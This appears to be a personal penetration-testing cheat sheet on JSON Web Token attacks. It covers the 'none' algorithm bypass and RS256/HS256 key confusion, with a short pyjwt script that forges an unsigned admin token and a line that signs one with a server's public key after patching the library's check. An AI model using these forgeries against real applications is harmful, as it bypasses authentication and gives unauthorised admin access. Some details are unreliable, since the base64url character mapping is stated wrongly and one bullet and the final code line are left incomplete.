# jwt 
Jwt.io can be used to generate tokens with a given secret. 

## jwt reading
https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/
- cool cli based walkthrough; with a splash of python
https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/

## jwt format
base64urlencode(json header).base64urlencode(json payload).base64urlencode(signature)
- note that  base64 != base64urlencoded
- In the  jwt, base64 "+" becomes "-" , "_" => "/" and "=" is dropped

## jwt security
Some implementations fail to disable use of "none" algorithm; this results 
in a user's ability to send arbitrary requests because the application won't
verify them.

## exploting
- always: check if an app will accept a "none" algorithm.
- always: check the order of your tokens if you're getting errors. Some
implementations will be pickey about this, for example if we have something
like : {"typ":"JWT","alg":"None"}, that != {"alg":"None","typ":"JWT"}
- if: you're getting errors, with none,

## python script to accomplish the above
Note python package "jwt" != "pyjwt", but iirc both result in needing to import
"jwt", which can then result in some confusion. For the below, pyjwt was used.

```python
#!/usr/bin/env python3
import time
import jwt
encoded = jwt.encode({'login': 'admin',"iat":int(time.time())}, None, algorithm=None)
print(encoded)
```

## trying to break RS256 algorithms, by sending JWT with HS256 alg,  signed with
## public key from server
# it's just a basic string check ,we can bypass this by commenting out
# the relevent lines in :*/lib/python3.6/site-packages/jwt/algorithms.py
# grep or search for PUBLIC
encoded = jwt.encode({'login':'admin'},open('public','rb').read(),algorithm='HS256'
